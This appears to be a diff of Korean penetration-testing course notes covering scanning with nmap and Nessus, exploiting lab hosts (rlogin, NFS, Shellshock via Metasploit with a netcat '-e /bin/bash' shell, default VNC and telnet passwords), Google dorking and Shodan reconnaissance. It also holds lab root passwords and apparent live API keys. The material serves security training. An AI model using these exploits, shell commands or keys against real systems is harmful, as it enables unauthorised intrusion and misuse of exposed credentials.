+					# wafw00f www.test.com	터미널 2 실행
+					# wafw00f www.seoul.ac.kr 터미널 2 실행
+					이제 부터 코드를 분석한다! 
+	
+		[정리]
+			namp
+				-sU, -sT, -sS, -sN, -sX, -sF, -O, -sV, -A, -T4, -oA
+			dnmap
+				dnmap.sh 개발
+			nmap NSE
+				banner.sh 개발
+				nmap --script banner.nse 192.168.20.200	-> 사용법
+			wafw00f
+				중간에 WAF가 있으면 중간에 응답패킷이 없거나 이상하게 출력하기 때문에 이거 하고 위에 커맨드들을 써보기 
+	
+					
+	
+5. 취약점 스캐너를 사용한 정보 수집
+	(툴)
+		OpenVAS
+		Nessus
+		Nexpose
+	
+	[실습] Nessus 이용한 시스템 취약점 분석
+		시나리오 : 윈도우7(웹브라우저,네서스서버,취약점스캐닝)에서 targethost에 걸음
+		(윈도우7)
+			firefox 다운로드 -> 기본브라우져로 설정하기!
+			http://www.nessus.org  -> products -> nessus -> 첫번째 nessus 클릭 -> 이름과 이메일 적기 -> 메일에서 코드확인
+			-> 홈페이지에서 다운로드 -> nessus-8.8.0-x64.msi -> 다운로드! -> winpcap이 없으면 다운해야함 
+			-> ssl 접속 -> 고급 -> 위험을 감수하고 계속 -> nessus essentials -> skip 
+			-> 62F9-5A72-6ECB-F94E-C7B1 넣기 -> soldesk/soldesk1.
+			=> 이걸 한 이유
+				- 툴을 웹브라우저를 이용해서 하는것 세계의 추세
+				- 넥서스 엔진을 다운받고 위에내용을 하면 플러그인(코드를넣는작업) 하는것
+		
+		(target system목록)
+			윈도우7(원본 OS) 	 			  : 172.16.6.63
+			linux252(CentOS 5.11)			  : 172.16.6.252	-> ping 172.16.6.252 해보기! root/centos
+			solaris254(Oracle Solaris 10 x86) : 172.16.6.254	-> ping 172.16.6.254 해보기! root/knit
+			metasploitableV2(Ubuntu 8.04)	  : 172.16.6.251	-> ping 172.16.6.254 해보기! root/soldesk1.
+		
+		설정
+		-> 왼쪽에 policies -> 가운데 create -> 있는것들이 진단용 코드임 상대편이 뭐인지 보고 핸드폰이면 핸드폰 눌러서 점검
+		-> advanced scan 은 직접구성하는것임
+		
+		[윈도우2008 점검] - dns mail ftp 서비스가 돌고있음 
+			(setting)
+				Name : win2008R2_01
+				왼쪽 나머지는 다 기본값
+			(credentials)
+				카테고리 : host
+				그 밑에 윈도우선택
+					오른쪽에 열리게됨 
+					Authentication method : password
+					username : administrator
+					password : soldesk1.
+			(plugins)
+				점검할 항목들을 선택
+			
+			밑에 세이브 클릭 그러면 하나가 생성된것을 확인
+			
+			왼쪽위에 my scans -> create new scan -> 위에 userdefined -> win2008R2_01 선택(특정policies에 대해 타겟을 정함)
+				(settings)
+					name			: win2008R2_01_01
+					description		: 2019.12.05 kt 연구소 취약점 점검
+					folder			: 기본값
+					targets			: 192.168.20.201 여러개 지정가능 우리는 16개까지 가능 돈주고 안사서 
+				(schedule)
+					자동으로 돌릴것이냐
+				(notifications)
+					이메일에 넣으면 자동으로 돌리고 이메일로 보내줌 
+				
+			밑에 세이브 클릭 그러면 하나 생성된것 확인
+				오른쪽에 재생버튼 클릭 그러면 돌아감  -> 그리고 해당 파일 누르면 돌아가는걸 볼 수 있음
+				게이지를 누르면 -> 게이지말고 페이지형태로 볼 수 있음 -> mixed 누르면 해당 mix된것들을 다 볼수 있음
+				
+		[linux252 점검] 172.16.6.252
+			policies -> 오른쪽 위 new policy -> advanced
+			(setting)
+				Name : centos
+				왼쪽 나머지는 다 기본값
+			(credentials)
+				카테고리 : host
+				그 밑에 ssh선택
+					오른쪽에 열리게됨 
+					Authentication method : password
+					username : root
+					password : centos
+			(plugins)
+				점검할 항목들을 선택
+			
+			밑에 세이브 클릭 그러면 하나가 생성된것을 확인
+			
+			왼쪽위에 my scans -> 오른쪽위 new scan -> 위에 userdefined -> win2008R2_01 선택(특정policies에 대해 타겟을 정함)
+				(general)
+					name			: centos511_01_01
+					description		: 201501205 skt취약점점검
+					folder			: 기본값
+					targets			: 172.16.6.252 여러개 지정가능 우리는 16개까지 가능 돈주고 안사서 
+				(schedule)
+					자동으로 돌릴것이냐
+				(notifications)
+					이메일에 넣으면 자동으로 돌리고 이메일로 보내줌 
+			
+			밑에 세이브 클릭 그러면 하나 생성된것 확인 -> 재생모양클릭
+			
+			ciritical 난거 확인 NFS Exported Share Information Disclosure	-> nfsuser에 마운트된거에 대한 취약점 발견!
+			
+			(칼리)	-> 크리티컬 한거 확인해보기 
+				# apt-cache search nfs
+				# apt-get install nfs-common nfs4-acl-tools nfswatch	설치하기
+				# showmount -e 172.16.6.252
+				# mkdir -p /mnt/server
+				# mount 172.16.6.252:/export/home/nfsuser /mnt/server	
+		
+		[solaris 점검] 172.16.6.254
+			policies -> 오른쪽 위 new policy -> advanced
+			(setting)
+				Name : solaris
+				왼쪽 나머지는 다 기본값
+			(credentials)
+				카테고리 : host
+				그 밑에 ssh선택
+					오른쪽에 열리게됨 
+					Authentication method : password
+					username : root
+					password : knit
+			(plugins)
+				점검할 항목들을 선택
+			
+			밑에 세이브 클릭 그러면 하나가 생성된것을 확인
+			
+			왼쪽위에 my scans -> 오른쪽위 new scan -> 위에 userdefined -> win2008R2_01 선택(특정policies에 대해 타겟을 정함)
+				(general)
+					name			: solaris804_01_01
+					description		: 201501205 lg취약점점검
+					folder			: 기본값
+					targets			: 172.16.6.254 여러개 지정가능 우리는 16개까지 가능 돈주고 안사서 
+				(schedule)
+					자동으로 돌릴것이냐
+				(notifications)
+					이메일에 넣으면 자동으로 돌리고 이메일로 보내줌 
+			
+			밑에 세이브 클릭 그러면 하나 생성된것 확인 -> 재생모양클릭
+			
+		[Ubuntu 점검] 172.16.6.251
+			policies -> 오른쪽 위 new policy -> advanced
+			(setting)
+				Name : Ubuntu804_01
+				왼쪽 나머지는 다 기본값
+			(credentials)
+				카테고리 : host
+				그 밑에 ssh선택
+					오른쪽에 열리게됨 
+					Authentication method : password
+					username : root
+					password : soldesk1. 
+				카테고리 : db
+					db type : postgresql
+					authtype : password
+					username : postgres
+					password : postgres
+			(plugins)
+				점검할 항목들을 선택
+			
+			밑에 세이브 클릭 그러면 하나가 생성된것을 확인
+			
+			왼쪽위에 my scans -> 오른쪽위 new scan -> 위에 userdefined -> win2008R2_01 선택(특정policies에 대해 타겟을 정함)
+				(general)
+					name			: Ubunto804_01_01
+					description		: 2019.12.05 samsung project
+					folder			: 기본값
+					targets			: 172.16.6.251 여러개 지정가능 우리는 16개까지 가능 돈주고 안사서 
+				(schedule)
+					자동으로 돌릴것이냐
+				(notifications)
+					이메일에 넣으면 자동으로 돌리고 이메일로 보내줌 
+			
+			밑에 세이브 클릭 그러면 하나 생성된것 확인 -> 재생모양클릭
+			
+			
+	
+	[실습] Nessus Report 결과를 분석하고 테스트 하기 
+		[실습] "rlogin Service Detection"
+			(칼리) -> solaris 10 172.16.6.254 로
+				# which rlogin
+				# ls -l /usr/bin/rlogin
+				# ls -l /etc/alternatives/rlogin
+				# ls -l /usr/bin/slogin
+				# apt-get -y install rsh-client
+				# dpkg -L rsh-client
+				# nmap -sV -p 512-514 172.16.6.254
+				# rlogin 172.16.6.254	-> 인증없이 들어감
+				(솔라리스)
+				# hostname 
+				# id 	-> 관리자임
+				# pwd
+				# uname -a 
+				# cat ~root/.rhosts 보면 ++ 로 인증없이 관리자로 들어온것
+			(칼리)
+				# rcp -r 172.16.6.254:/backup/* /test		scp는 암호화 rcp는 평문 
+				# tree
+	
+		[실습] "GNU Bash Environment Variable Handling Code Injection (Shellshock)"
+			(칼리)  -> solaris 10 172.16.6.254 로
+				# nmap -sV -p 80 172.16.6.245 
+				# systemctl enable postgresql
+				# systemctl restart postgresql
+				# msfconsole
+					> help search
+					> search type:auxiliary name:bash
+					> use auxiliary/scanner/http/apache_mod_cgi_bash_env
+					> show options
+					> set RHOSTS 172.16.6.245
+					> set TARGETURI /cgi-bin/test.cgi
+					> run -> show options 의 CMD 에 있는게 실행됨
+					(CMD교체)
+					> set CMD /usr/pkg/bin/nc -l -p 4444 -e /bin/bash
+					> run
+					(터미널2번째)
+					> nc 172.16.6.254 4444 		-> 실습에선 서버에서 nc가 없어서 안됐음
+					
+		[실습] "VNC Server 'password' Password"
+			(칼리) -> ubunto 172.16.6.251
+				# vncviewer --help
+				# vncviewer 172.16.6.251::5900
+					password하면 들어가짐
+		
+		[실습] "Unencrypted Telnet Server"
+			(칼리) -> ubunto 172.16.6.251
+				# nmap -sV -p 23 172.16.6.251
+				# (sleep 3; echo 'quit') | telnet 172.16.6.251 
+				# telnet 172.16.6.251 
+					msfadmin
+					msfadmin
+				$ export TERM=vt100
+				$ sudo su - 
+					msfadmin
+		
+		[복원] nessus 서비스 내리기!
+		
+
+
+5. 검색 엔진을 이용한 정보 수집
+	용어
+		구글링   : 구글사이트에서 정보를 검색
+		구글해킹 : 여러가지 키워드를 이용해 검색 효율을 높인다 구글은 캐시기능때문에 페이지가 사라져도 검색결과에 노출되기 때문에 취약점을 찾을 수 있다
+		GHDB     : 치명적인 자료를 찾거나 구하는 방법 EX) site:co.kr inurl:admin intext:admin
+				-www.exploit-db.com 사이트에 있음
+	
+	구글 검색 지시자
+		기본적인 검색 키워드 
+			- site	  : co.kr
+			- inurl   : admin
+			- filetype: asp
+			- ext 	  : log
+			- intext  : passwd
+			- intitle :"MS SQL"
+	
+	[실습] 구글 검색 내용 삭제에 대해서	-> 구글에 캐싱되어있는데 원본이 살아지면 캐싱을 삭제해달라고 요청이 가능하다
+		● https://www.google.com/webmasters/tools/removals?hl=ko
+	
+	[실습] GHDB 활용한 악의적인 정보 수집(발표)
+		● https://www.exploit-db.com/google-hacking-database/
+		-> 인덱싱 기능 끄기
+			(리눅스200)
+			# vi /etc/httpd/conf
+				144 번째 indexes 지우기 
+		
+	[실습]robots.txt 파일에 대해	
+		robots.txt -> 검색로봇 : 이는 검색을 해주는것임
+								 최상단에 있어야함 
+								 /admin을 칠 경우 캐싱이 되기 때문에 이를 이용해서 admin을 캐싱시키지 않게 해서(로봇이 들어가지않음) 안전하게 함
+								 반대로 이를 이용해 들어가지 못하는 폴더를 확인해서 해킹이 가능
+		● http://www.google.com/robots.txt
+		● http://www.naver.com/robots.txt
+		● https://www.seoul.ac.kr/robots.txt
+
+		장점 : 중요한 파일 또는 디렉터리를 캐싱시키지 못하게 만들어서 검색될일이없음
+		단점 : 해커들이나 악의적인 사용자에게 중요한 파일이나 폴더라는것을 알려주게됨 
+	
+	[실습] archive.org 사이트 
+		정의 : 실시간으러 검색엔진을 캐시시킨것을 버리지않고 계속 저장시켜놓은 사이트이다 따라서 예전 데이터를 검색 가능(WayBack Machine)
+		
+	[실습] SHODAN 사이트를 사용한 정보 검색
+		정의 : www.shodan.io 에는 악의적인 정보를 캐싱된거를 저장한것 
+		● https://www.youtube.com/watch?v=wcsSBk6AY3I	->활용하는 법 youtube
+		● https://www.youtube.com/watch?v=hxF3QG4LKLk	->활용하는 법 youtube
+		● https://www.youtube.com/watch?v=FjAxbwEMht4	->활용하는 법 youtube
+		기본 비밀번호 정의 https://ipvm.com/reports/ip-cameras-default-passwords-directory
+		
+	[실습] msfconsole shodan
+		(칼리)
+			# msfconsole -q
+				> search shodan 	->2번재꺼 쓰기 
+				> use 2번째꺼
+				> show options
+				> set QUERY webcamxp
+				> set shodan_apikey AvH53Lusf6rmSBXgDOuytZwqGNL6661X  -> 이거는 show api key에 난수받는거있음
+				> run
+			ip나온거 복사해서 붙여넣으면 됨
+	
+	[실습] showdansploit 설치 -> vpn 컨넥션 써야함
+		(칼리)
+			# cd /test
+			# git clone https://github.com/shodansploit/shodansploit
+			# cd shodansploit/
+			# chmod 700 shodansploit.py
+			# ./shodansploit.py
+			하고싶은 번호 넣고
+			아이피쓰기 
+			# mv shodansploit/ /opt
+			
+	[실습] showdan CLI 사용해보기
+		홈페이지 -> 상단의 아이콘클릭 development -> command-line friendly 부분의 install the CLI 선택
+		(칼리)
+			# apt-get -y install python-pip
+			# pip install shodan
+			# which shodan
+			# shodan init AvH53Lusf6rmSBXgDOuytZwqGNL6661X			이 난수는 api 키임 
+			# shodan count microsoft iis 6.0						6.0관련 취약부분이 나오는것 
+			# shodan download microsoft-data microsoft iis 6.0 		6.0에 대한 취약부분 다운로드 받음 
+			# gzip -d microsoft-data.json.gz
+			# gedit microsoft-data.json 
+			# shodan host 109.115.78.24
+			# shodan my ip
+			# shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz
+			# shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0
+		
+		# shodan stats --facets vuln country:KR
+		구글검색 : CVE-2017-15906
+	
+	[실습] 구글 검색을 활용한 문서 목록 검색 (goofile)
+		(칼리)
+			# apt-get -y install goofile
+			# which goofile
+			# file /usr/bin/goofile
+			# goofile -d lwbooks.co.kr -f pdf
+				여러개나옴
+			# wget 하나선택해서 다운
+	
+	[실습] 구글 검색을 활용한 문서 목록 검색 (metagoofil)
+		(칼리)
+			# apt-get -y install metagoofil
+			# file /usr/bin/metagoofil
+			# metagoofil
+			# metagoofil \
+				-d lwbooks.co.kr \
+				-t pdf \
+				-l 50 \
+				-n 5 \
+				-o test \
+				-f
+					-> 하면 저장됨
+		(코드분석)
+		# which metagoofil 
+		# file /usr/bin/metagoofil 
+		# cat /usr/bin/metagoofil 
+		# cd /usr/share/metagoofil 
+		# ls
+		# cat metagoofil.py 
+	
+	[실습] metagoofil.sh 코드 제작 
+		https://developers.google.com/custom-search/json-api/v1/reference/cse/list?hl=ko
+		http://androiddev.tistory.com/65?category=499237
+		API 를 만듬
+		
+		스크립트제작
+			#!/bin/bash
+
+			if [ $# -ne 2 ] ; then
+				echo "Usage: $0 <search keyward> <file extension>"
+				exit 1
+			fi
+	
+			PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+			PATH=$PATH:/root/bin
+	
+			KEYWORD=$1
+			EXTENSION=$2
+			FILE1=output.txt
+			FILE2=output2.txt
+	
+			rm -f $FILE1 $FILE2
+	
+			export SHOPPING_SEARCH_URI=https://www.googleapis.com/customsearch/v1
+			export API_KEY=AIzaSyB95RWqPQMdl8M6CxNR50lmOe058fTlRBg
+			export CX=001682847035065033954:9wwngi41isi
+			curl --get \
+			-d key=$API_KEY \
+			-d cx=$CX \
+			-d fileType=$EXTENSION \
+			--data-urlencode "q=$KEYWORD" \
+			$SHOPPING_SEARCH_URI > $FILE1
+			
+			cat $FILE1 | fgrep '"link":' \
+					| awk -F, '{print $1}' \
+					| awk '{print $2}' \
+					| grep ".$EXTENSION" > $FILE2
+			
+			[ ! -d download_docs ] && mkdir -p download_docs || rm -rf download_docs/*
+			cd download_docs
+			
+			for i in `cat ../$FILE2`
+			do
+				echo "[*] download : $i "
+				eval wget -q --no-check-certificate $i >/dev/null 2>&1
+				if [ $? -eq 0 ] ; then
+					"[+] download : $i"
+				else
+					"[-] download : $i"
+				fi
+			done
+			
+			# rm -f $FILE1 $FILE2
+		
+		# chmod 700 metagoofil.sh 
+		# ./meagoofil.sh  
+		# ./metagoofil.sh virtualization pdf 
+		# ls -1 download_docs 
+
+			
+		
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
